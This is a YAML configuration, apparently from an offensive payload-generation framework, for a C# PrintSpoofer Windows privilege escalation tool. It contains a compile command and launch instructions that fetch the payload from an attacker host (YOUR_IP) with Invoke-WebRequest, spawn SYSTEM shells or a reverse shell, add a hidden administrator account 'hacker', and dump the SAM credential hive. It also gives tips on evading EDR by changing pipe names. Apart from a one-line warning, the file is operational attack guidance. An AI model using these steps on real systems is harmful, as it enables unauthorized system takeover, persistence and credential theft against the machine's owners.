meta:
  name: "PrintSpoofer Privilege Escalation (C#)"
  category: "Privilege Escalation"
  description: |
    Local privilege escalation by stealing SYSTEM token from Windows Print Spooler service.
    
    Features:
    - Named pipe impersonation technique
    - Steals SYSTEM token from Print Spooler
    - Spawns arbitrary process with elevated privileges
    - Works from any user context
    - No exploit required (abuses legitimate Windows functionality)
    
    This technique creates a named pipe and waits for the Print Spooler service
    to connect. Upon connection, it impersonates the service's SYSTEM token and
    uses it to spawn a new process with full privileges.
    
    WARNING: For authorized security testing only!

  effectiveness: "high"

  mitre:
    tactic: "TA0004 - Privilege Escalation"
    technique: "T1134.001 - Access Token Manipulation: Token Impersonation/Theft"

  artifacts:
    - "Named pipe creation (\\pipe\\ namespace)"
    - "Print Spooler service connection to pipe"
    - "ImpersonateNamedPipeClient API calls"
    - "DuplicateTokenEx for token theft"
    - "CreateProcessWithTokenW spawning elevated process"
    - "New process running as NT AUTHORITY\\SYSTEM"

parameters:
  - name: "binary_path"
    type: "string"
    description: "Full path to binary to execute with SYSTEM privileges"
    required: true
    default: "C:\\Windows\\System32\\cmd.exe"

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "printspoofer.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "privilege_escalation/printspoofer.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
  launch_instructions: |
    C# PrintSpoofer Privilege Escalation - Launch Instructions

    Prerequisites:

    - Windows 10/11 or Server 2016+ target
    - Print Spooler service must be running (default)
    - Check: sc query spooler

    Step 1: Transfer Payload to Target

    Transfer the generated executable to the target Windows system:

    Using Python HTTP server:
    python3 -m http.server 8080

    On target (PowerShell):
    Invoke-WebRequest -Uri "http://YOUR_IP:8080/{{ output_file }}" -OutFile "{{ output_file }}"

    Step 2: Execute PrintSpoofer

    Run with default pipe name and your chosen binary:

    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss {{ binary_path }}

    Example - Spawn SYSTEM cmd.exe:
    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\System32\\cmd.exe

    Example - Spawn SYSTEM PowerShell:
    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

    Example - Execute reverse shell:
    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\Temp\\reverse.exe

    Step 3: Verify Elevation

    In the spawned process, check privileges:
    whoami
    whoami /priv
    whoami /groups

    Should show: NT AUTHORITY\\SYSTEM

    Notes:

    - Requires Print Spooler service running (enabled by default)
    - Works from any user privilege level
    - No UAC bypass needed
    - Well-known technique, may be detected by EDR
    - Binary path must be absolute and accessible
    - Tool waits for Print Spooler connection before spawning process

    Common Use Cases:

    Spawn interactive SYSTEM shell:
    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss cmd.exe

    Add admin user:
    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

    Dump SAM database:
    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss "reg.exe save hklm\\sam C:\\Windows\\Temp\\sam"

    Troubleshooting:

    - If Print Spooler not running: sc start spooler
    - Check service status: sc query spooler
    - Verify binary path is correct and executable exists
    - Some EDR products may block this technique
    - Try different pipe names if default is monitored

    Cleanup:

    After testing, remove the payload:
    Remove-Item {{ output_file }} -Force
